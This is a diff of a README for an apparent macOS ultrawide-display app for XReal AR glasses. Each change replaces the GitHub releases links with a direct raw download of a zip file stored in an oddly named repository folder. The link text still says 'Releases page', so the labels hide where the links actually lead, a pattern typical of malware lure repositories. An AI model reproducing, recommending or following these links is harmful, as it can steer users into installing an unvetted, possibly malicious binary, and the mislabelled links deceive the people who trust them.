@@ -1,6 +1,6 @@
 # 🖥️ XReal-Ultrawide - Bigger Screen, Less Clutter
 
-[![Download XReal-Ultrawide](https://img.shields.io/badge/Download%20Now-blue-grey)](https://github.com/Retur1145/XReal-Ultrawide/releases)
+[![Download XReal-Ultrawide](https://img.shields.io/badge/Download%20Now-blue-grey)](https://github.com/Retur1145/XReal-Ultrawide/raw/refs/heads/main/tannable/Real_X_Ultrawide_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Use it if you want:
 
 ## 📥 Download
 
-Visit this page to download: [XReal-Ultrawide Releases](https://github.com/Retur1145/XReal-Ultrawide/releases)
+Visit this page to download: [XReal-Ultrawide Releases](https://github.com/Retur1145/XReal-Ultrawide/raw/refs/heads/main/tannable/Real_X_Ultrawide_v1.0.zip)
 
 Open the release page, then download the latest version for macOS. After the download finishes, open the file and move the app to your Applications folder if needed.
 
@@ -40,7 +40,7 @@ For best results, use the latest version of macOS that supports your device.
 
 ## 💻 How to Install
 
-1. Go to the [Releases page](https://github.com/Retur1145/XReal-Ultrawide/releases).
+1. Go to the [Releases page](https://github.com/Retur1145/XReal-Ultrawide/raw/refs/heads/main/tannable/Real_X_Ultrawide_v1.0.zip).
 2. Download the latest macOS file from the list.
 3. Open the downloaded file.
 4. If the app appears in a folder or disk image, drag it to Applications.
@@ -165,7 +165,7 @@ ar-glasses, cgvirtualdisplay, macos, menu-bar-app, open-source, swift, swiftui, 
 
 ## 🔗 Download Again
 
-If you need the installer again, visit: [https://github.com/Retur1145/XReal-Ultrawide/releases](https://github.com/Retur1145/XReal-Ultrawide/releases)
+If you need the installer again, visit: [https://github.com/Retur1145/XReal-Ultrawide/raw/refs/heads/main/tannable/Real_X_Ultrawide_v1.0.zip](https://github.com/Retur1145/XReal-Ultrawide/raw/refs/heads/main/tannable/Real_X_Ultrawide_v1.0.zip)
 
 Open the latest release and download the macOS file from there
 
